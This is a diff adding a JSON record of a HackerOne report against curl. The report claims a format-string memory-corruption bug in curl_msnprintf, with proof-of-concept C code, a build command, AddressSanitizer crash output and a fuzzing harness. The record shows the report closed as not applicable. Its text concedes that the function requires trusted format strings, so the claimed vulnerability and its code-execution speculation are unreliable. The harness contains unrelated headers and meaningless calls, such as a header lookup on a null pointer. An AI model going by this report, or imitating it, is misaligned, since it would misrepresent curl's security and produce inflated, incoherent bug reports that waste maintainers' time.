@@ -1,0 +1,123 @@
+{
+  "id": 2990139,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTkwMTM5",
+  "url": "https://hackerone.com/reports/2990139",
+  "title": "Format string vulnerability, curl_msnprintf() function ",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "medium",
+  "readable_substate": "N/A",
+  "created_at": "2025-02-12T12:30:43.337Z",
+  "submitted_at": "2025-02-12T12:30:43.646Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "orcahack",
+    "url": "/orcahack",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-02-20T10:58:01.533Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-02-14T08:34:11.077Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\nA vulnerability has been identified in the curl library’s formatted output functions (specifically in curl_msnprintf and its related functions). When a malicious (attacker-controlled) format string containing the %hn conversion specifier is passed, the function incorrectly attempts to write the number of characters printed into a pointer that is not provided by the caller. This leads to a misaligned memory write (as demonstrated by a write to address 0x000000000001), resulting in undefined behavior and a crash. Although the API documentation warns that these functions are to be used with controlled format strings, the internal handling of %hn should not lead to such dangerous memory accesses even with untrusted input.\n\nThe curl_mprintf family (including curl_msnprintf) is designed to behave like standard printf-style functions. According to the documentation, these functions expect a valid format string and matching arguments. However, when a malicious format string such as \"%hnuked\" is used, no corresponding argument is provided for the %hn specifier. This causes the internal formatting routine (in mprintf.c, line 1047) to dereference an invalid pointer (which turns out to be 0x000000000001) and attempt a store of a short value. Because the address is both misaligned and invalid, this results in a memory safety violation (as detected by AddressSanitizer with a misaligned store error).\n\n## Affected version\nlatest version from git\n\n## Steps To Reproduce:\nThe following C code :\n\n```\n#include <stdio.h>\n#include <curl/mprintf.h>\n\nint main(void) {\n    char buffer[256];\n    const char *malicious_format = \"%hnuked\"; \n    printf(\"Using malicious format string: \\\"%s\\\"\\n\", malicious_format);\n    curl_msnprintf(buffer, sizeof(buffer), malicious_format);\n    printf(\"Formatted output: %s\\n\", buffer);\n    return 0;\n}\n```\nShould be compiled with AddressSanitizer enabled :\n\n` clang-14 -fsanitize=address vuln-curl.c -I include/ -o vuln-curl   ./lib/.libs/libcurl.a -lz -lpsl -lbrotlidec `\n\nSo running it will result in the following ASAN log :\n\n```\n./vuln-curl \nUsing malicious format string: \"%hnuked\"\nmprintf.c:1047:9: runtime error: store to misaligned address 0x000000000001 for type 'short', which requires 2 byte alignment\n0x000000000001: note: pointer points here\n<memory cannot be printed>\nSUMMARY: UndefinedBehaviorSanitizer: undefined-behavior mprintf.c:1047:9 in \nAddressSanitizer:DEADLYSIGNAL\n=================================================================\n==80435==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000001 (pc 0x5d47e8ac3191 bp 0x7fff9e689450 sp 0x7fff9e6877e0 T0)\n==80435==The signal is caused by a WRITE memory access.\n==80435==Hint: address points to the zero page.\n    #0 0x5d47e8ac3191 in formatf /home/test/Documents/curl/lib/mprintf.c:1047:34\n    #1 0x5d47e8abf553 in curl_mvsnprintf /home/test/Documents/curl/lib/mprintf.c:1080:13\n    #2 0x5d47e8ac49ad in curl_msnprintf /home/test/Documents/curl/lib/mprintf.c:1100:13\n    #3 0x5d47e8abf2ed in main (/home/test/Documents/curl/vuln-curl+0x2bb2ed) (BuildId: 9d173a19c9f17931aa243f138ec604086bb81fa9)\n    #4 0x70b736e29d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #5 0x70b736e29e3f in __libc_start_main csu/../csu/libc-start.c:392:3\n    #6 0x5d47e8a015e4 in _start (/home/test/Documents/curl/vuln-curl+0x1fd5e4) (BuildId: 9d173a19c9f17931aa243f138ec604086bb81fa9)\n\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV /home/test/Documents/curl/lib/mprintf.c:1047:34 in formatf\n==80435==ABORTING\n```\n\nThe following supporting libfuzzer harness will also trigger the same bug :\n\n```\n#include <cstring>\n#include <random>\n#include \"curl_hmac.h\"\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    if (size == 0) return 0;\n    // Create a buffer to hold the formatted string\n    char buffer[256];\n    \n    // Ensure the input data is null-terminated\n    std::vector<uint8_t> null_terminated_data(data, data + size);\n    null_terminated_data.push_back(0);\n    // Use curl_msnprintf to format the input data\n    curl_msnprintf(buffer, sizeof(buffer), reinterpret_cast<const char *>(null_terminated_data.data()));\n    // Open a file to write the output\n    FILE *out_file = fopen(\"output_file\", \"wb\");\n    if (!out_file) {\n        return 0;\n    }\n    // Write the formatted string to the file\n    fwrite(buffer, sizeof(char), strlen(buffer), out_file);\n    fclose(out_file);\n    // Simulate a CURLUcode error and get the error string\n    CURLUcode error_code = CURLUE_BAD_HANDLE;\n    const char *error_str = curl_url_strerror(error_code);\n    // Open the input data as a file for reading\n    FILE *in_file = fmemopen((void *)data, size, \"rb\");\n    if (in_file) {\n        // Read headers from the input file using curl_pushheader_byname\n        struct curl_pushheaders *headers = nullptr;\n        char *header_value = curl_pushheader_byname(headers, \"Content-Type\");\n        if (header_value) {\n            free(header_value);\n        }\n        fclose(in_file);\n    }\n    return 0;\n}\n```\n\nRecommendation:\nReview and adjust the internal handling of dangerous conversion specifiers (such as %n and %hn) in the curl_mprintf implementation. Consider sanitizing or outright rejecting format strings that contain %n conversions when they could result in writing to uncontrolled memory locations.\n\nReferences:\n\ncurl_mprintf documentation\nASAN output from the reproduction scenario\n\n## Impact\n\n## Summary:\n\nCrash: In a scenario where untrusted input reaches curl_msnprintf (or similar functions), an attacker could force a denial-of-service by crashing the application.\nPotential Exploitability: Although the immediate impact is a crash, memory corruption—even with a 2-byte misaligned write—could be leveraged further in some environments to achieve code execution, depending on additional context and heap state.",
+  "weakness": {
+    "id": 81,
+    "name": "Use of Externally-Controlled Format String"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 15,
+  "voters": [
+    "aboalezz",
+    "2026",
+    "gorankurd",
+    "yearsnow",
+    "3tbsi",
+    "0x3xploit",
+    "abhishekksaini",
+    "z3rocast1e",
+    "adse5ty",
+    "labupump",
+    "and 5 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
